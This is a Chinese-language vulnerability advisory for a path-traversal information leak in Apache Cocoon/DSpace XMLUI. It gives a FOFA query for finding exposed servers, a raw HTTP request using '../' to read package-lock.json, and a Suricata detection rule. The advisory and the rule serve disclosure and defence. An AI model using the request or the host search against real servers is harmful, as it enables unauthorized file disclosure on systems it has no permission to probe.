# Apache Cocoon 存在静态文件信息泄露漏洞

Apache Cocoon 存在静态文件信息泄露漏洞

# 影响版本

Apache Cocoon 2.x

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **app=&quot;apache-cocoon&quot;**

**POC/EXP：**

**step1 信息泄露**

```
GET /xmlui/themes/Mirage2/images/UCrea/pc/../../../package-lock.json HTTP/1.1
Host: 127.0.0.1
Cookie: JSESSIONID=B0585B89D4E135D6E4B7CA9CA3044CA6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
Connection: Keep-alive


```

​![image](assets/image-20260910020518-njq5tda.png)​

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"Apache Cocoon/DSpace XMLUI Mirage2 静态资源路径遍历读 package-lock.json (../ information disclosure)";
    flow:to_server,established;
    http.method; content:"GET"; nocase;
    http.raw_uri;
        content:"/xmlui/themes/Mirage2/";
        fast_pattern;
        nocase;
        content:"../";
        nocase;
        content:"package-lock.json";
        nocase;
    metadata:
        service http,
        affected_product "Apache Cocoon/DSpace XMLUI Mirage2",
        vulnerability_type "Path Traversal/Static File Information Disclosure",
        reference "CVE-2016-10726,CVE-2003-1172",
        severity "high";
    classtype:web-application-attack;
    sid:1001101;
    rev:1;
    priority:2;
)
```

# 漏洞修复

建议用户更新至最新补丁

‍
